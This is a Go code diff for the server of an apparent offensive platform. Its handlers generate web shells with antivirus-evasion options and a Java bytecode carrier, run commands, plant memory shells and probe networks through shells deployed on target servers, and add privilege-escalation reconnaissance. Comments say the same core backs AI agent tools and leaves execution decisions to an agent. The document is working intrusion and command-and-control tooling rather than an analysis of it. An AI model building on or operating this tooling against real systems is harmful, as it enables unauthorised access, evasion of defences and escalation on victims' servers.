@@ -6,9 +6,9 @@ package server
 // 与 agent 工具 webshell_gen/webshell_exec 同一内核，这里给工具箱 UI 用。
 
 import (
-	"fmt"
 	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -95,7 +95,7 @@ func (s *Server) webshellGenerateAIAPI(w http.ResponseWriter, r *http.Request) {
 	}})
 }
 
-// POST /api/tools/webshell/generate {script_type, encoder, password, filename?}
+// POST /api/tools/webshell/generate {script_type, encoder, password, filename?, carrier?}
 func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	var b struct {
 		ScriptType string `json:"script_type"`
@@ -104,9 +104,11 @@ func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
 		Filename   string `json:"filename"`
 		GateHeader string `json:"gate_header"`
 		GateValue  string `json:"gate_value"`
-	
-		Evasive    bool   `json:"evasive"`
-		EvasiveLevel int  `json:"evasive_level"` }
+		Carrier    string `json:"carrier"` // ""/script=脚本承载源码；java=动态载荷载体
+
+		Evasive      bool `json:"evasive"`
+		EvasiveLevel int  `json:"evasive_level"`
+	}
 	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
 		writeErr(w, 400, "bad json: "+err.Error())
 		return
@@ -118,9 +120,23 @@ func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	if b.Encoder == "" {
 		b.Encoder = "raw"
 	}
-	code, err := webshell.GenerateShellEvasive(b.ScriptType, b.Encoder, b.Password, webshell.GateOpts{
-		Header: b.GateHeader, Value: b.GateValue,
-	}, webshell.EvasiveOpts{Enabled: b.Evasive, Level: b.EvasiveLevel})
+	gate := webshell.GateOpts{Header: b.GateHeader, Value: b.GateValue}
+	var (
+		code      string
+		err       error
+		generator = "builtin"
+	)
+	if b.Carrier == "java" {
+		if b.Evasive {
+			writeErr(w, 400, "Java 载体不支持免杀变形（免杀层改写的是脚本源码，载体本身没有可混淆的脚本文本）")
+			return
+		}
+		code, err = webshell.GenerateJavaCarrierOpts(b.ScriptType, b.Encoder, b.Password, gate)
+		generator = "java-carrier"
+	} else {
+		code, err = webshell.GenerateShellEvasive(b.ScriptType, b.Encoder, b.Password, gate,
+			webshell.EvasiveOpts{Enabled: b.Evasive, Level: b.EvasiveLevel})
+	}
 	if err != nil {
 		writeErr(w, 400, err.Error())
 		return
@@ -137,11 +153,16 @@ func (s *Server) webshellGenerateAPI(w http.ResponseWriter, r *http.Request) {
 		writeErr(w, 500, "写文件失败: "+err.Error())
 		return
 	}
-	writeJSON(w, 200, map[string]any{"data": map[string]any{
+	resp := map[string]any{
 		"path": p, "filename": name, "code": code, "size": len(code),
-		"script_type": b.ScriptType, "encoder": b.Encoder,
-		"self_check": webshell.SelfCheck(b.ScriptType, code),
-	}})
+		"script_type": b.ScriptType, "encoder": b.Encoder, "carrier": b.Carrier,
+		"generator": generator,
+	}
+	// 自检针对「脚本文本里的密码门/命令执行特征」，载体是字节码加载器，没有可检特征
+	if b.Carrier != "java" {
+		resp["self_check"] = webshell.SelfCheck(b.ScriptType, code)
+	}
+	writeJSON(w, 200, map[string]any{"data": resp})
 }
 
 // POST /api/tools/webshell/exec — 连接已部署 shell 执行操作。
@@ -152,6 +173,8 @@ func (s *Server) webshellExecAPI(w http.ResponseWriter, r *http.Request) {
 		TargetID   int64  `json:"target_id"` // 已存目标：服务端自取连接参数，前端无需传明文（1949）
 		Encoder    string `json:"encoder"`
 		ScriptType string `json:"script_type"`
+		Carrier    string `json:"carrier"`
+		Disguise   string `json:"disguise"`
 		Op         string `json:"op"`
 		Cmd        string `json:"cmd"`
 		Path       string `json:"path"`
@@ -168,9 +191,10 @@ func (s *Server) webshellExecAPI(w http.ResponseWriter, r *http.Request) {
 	}
 	if b.TargetID > 0 { // 按已存目标解析连接参数（密码服务端解密，不经前端）
 		var pwEnc string
-		if err := s.m.PG().QueryRow(`SELECT url, password, encoder, script_type, COALESCE(headers,'')
+		if err := s.m.PG().QueryRow(`SELECT url, password, encoder, script_type, COALESCE(headers,''),
+			COALESCE(carrier,''), COALESCE(disguise,'')
 			FROM webshell_targets WHERE id=$1`, b.TargetID).
-			Scan(&b.URL, &pwEnc, &b.Encoder, &b.ScriptType, &b.Headers); err != nil {
+			Scan(&b.URL, &pwEnc, &b.Encoder, &b.ScriptType, &b.Headers, &b.Carrier, &b.Disguise); err != nil {
 			writeErr(w, 404, "webshell 目标不存在")
 			return
 		}
@@ -195,6 +219,7 @@ func (s *Server) webshellExecAPI(w http.ResponseWriter, r *http.Request) {
 	cli := &webshell.Client{
 		URL: b.URL, Password: b.Password, Encoder: b.Encoder, ScriptType: b.ScriptType,
 		Cwd: b.Cwd, Timeout: time.Duration(b.Timeout) * time.Second,
+		Carrier: b.Carrier, Disguise: b.Disguise,
 	}
 	cli.Proxy = s.exitProxyFor(b.URL)
 	if b.Headers != "" {
@@ -224,6 +249,8 @@ func (s *Server) webshellExtAPI(w http.ResponseWriter, r *http.Request) {
 		TargetID   int64  `json:"target_id"` // 已存目标：服务端自取连接参数（1949）
 		Encoder    string `json:"encoder"`
 		ScriptType string `json:"script_type"`
+		Carrier    string `json:"carrier"`
+		Disguise   string `json:"disguise"`
 		Op         string `json:"op"`
 		Headers    string `json:"headers"`
 		Timeout    int    `json:"timeout"`
@@ -235,13 +262,21 @@ func (s *Server) webshellExtAPI(w http.ResponseWriter, r *http.Request) {
 	}
 	if b.TargetID > 0 { // 按已存目标解析连接参数（密码服务端解密，不经前端）
 		var pwEnc string
-		if err := s.m.PG().QueryRow(`SELECT url, password, encoder, script_type, COALESCE(headers,'')
+		if err := s.m.PG().QueryRow(`SELECT url, password, encoder, script_type, COALESCE(headers,''),
+			COALESCE(carrier,''), COALESCE(disguise,'')
 			FROM webshell_targets WHERE id=$1`, b.TargetID).
-			Scan(&b.URL, &pwEnc, &b.Encoder, &b.ScriptType, &b.Headers); err != nil {
+			Scan(&b.URL, &pwEnc, &b.Encoder, &b.ScriptType, &b.Headers, &b.Carrier, &b.Disguise); err != nil {
 			writeErr(w, 404, "webshell 目标不存在")
 			return
 		}
 		b.Password = s.wsDecryptPassword(pwEnc)
+	}
+	// Java 载体只认字节码，插件源码发过去必然是 bad wire。能在载荷里用 JDK 自带 API
+	// 等价重写的几项（内存马/进程/网络/数据库）放行，由 client 映射成载荷 op；
+	// zip/servlet/jar/screenshot 这些依赖容器或脚本运行时的仍是脚本载体专属。
+	if b.Carrier == "java" && !webshell.JavaExtSupported(b.Op) {
+		writeErr(w, 400, "Java 载体不支持该扩展操作（可用：内存马、进程、网络探测、数据库；压缩/Servlet/Jar/屏幕截图仍是脚本载体专属）")
+		return
 	}
 	if strings.TrimSpace(b.URL) == "" || strings.TrimSpace(b.Password) == "" {
 		writeErr(w, 400, "url 与 password 必填（或 target_id 对应目标无密码）")
@@ -253,6 +288,7 @@ func (s *Server) webshellExtAPI(w http.ResponseWriter, r *http.Request) {
 	cli := &webshell.Client{
 		URL: b.URL, Password: b.Password, Encoder: b.Encoder, ScriptType: b.ScriptType,
 		Timeout: time.Duration(b.Timeout) * time.Second,
+		Carrier: b.Carrier, Disguise: b.Disguise,
 	}
 	cli.Proxy = s.exitProxyFor(b.URL)
 	if b.Headers != "" {
@@ -277,4 +313,68 @@ func base64Encode(b []byte) string {
 		return ""
 	}
 	return base64.StdEncoding.EncodeToString(b)
+}
+
+// POST /api/tools/webshell/privesc {target_id} 或 {url,password,...}
+//
+// 提权面分析：跑一组只读查询，把结果结构化。不内置任何 exp 二进制——
+// 一是第三方 exp 授权不明、二是落地即被查杀；平台负责判断，执行交给 Agent 决策。
+func (s *Server) webshellPrivescAPI(w http.ResponseWriter, r *http.Request) {
+	var b struct {
+		TargetID   int64  `json:"target_id"`
+		URL        string `json:"url"`
+		Password   string `json:"password"`
+		Encoder    string `json:"encoder"`
+		ScriptType string `json:"script_type"`
+		Carrier    string `json:"carrier"`
+		Disguise   string `json:"disguise"`
+		Headers    string `json:"headers"`
+		Timeout    int    `json:"timeout"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&b); err != nil {
+		writeErr(w, 400, "bad json: "+err.Error())
+		return
+	}
+	if b.TargetID > 0 {
+		var pwEnc string
+		if err := s.m.PG().QueryRow(`SELECT url, password, encoder, script_type, COALESCE(headers,''),
+			COALESCE(carrier,''), COALESCE(disguise,'')
+			FROM webshell_targets WHERE id=$1`, b.TargetID).
+			Scan(&b.URL, &pwEnc, &b.Encoder, &b.ScriptType, &b.Headers, &b.Carrier, &b.Disguise); err != nil {
+			writeErr(w, 404, "webshell 目标不存在")
+			return
+		}
+		b.Password = s.wsDecryptPassword(pwEnc)
+	}
+	if strings.TrimSpace(b.URL) == "" || strings.TrimSpace(b.Password) == "" {
+		writeErr(w, 400, "url 与 password 必填（或 target_id 对应的目标无密码）")
+		return
+	}
+	if b.Encoder == "" {
+		b.Encoder = "raw"
+	}
+	if b.ScriptType == "" {
+		b.ScriptType = "php"
+	}
+	if b.Timeout <= 0 || b.Timeout > 120 {
+		b.Timeout = 30
+	}
+	cli := &webshell.Client{
+		URL: b.URL, Password: b.Password, Encoder: b.Encoder, ScriptType: b.ScriptType,
+		Timeout: time.Duration(b.Timeout) * time.Second,
+		Carrier: b.Carrier, Disguise: b.Disguise,
+	}
+	cli.Proxy = s.exitProxyFor(b.URL)
+	if b.Headers != "" {
+		var hs map[string]string
+		if json.Unmarshal([]byte(b.Headers), &hs) == nil {
+			cli.ExtraHeaders = hs
+		}
+	}
+	rep, err := webshell.RunPrivesc(cli)
+	if err != nil {
+		writeErr(w, 502, "提权面分析失败: "+err.Error())
+		return
+	}
+	writeJSON(w, 200, map[string]any{"data": rep})
 }
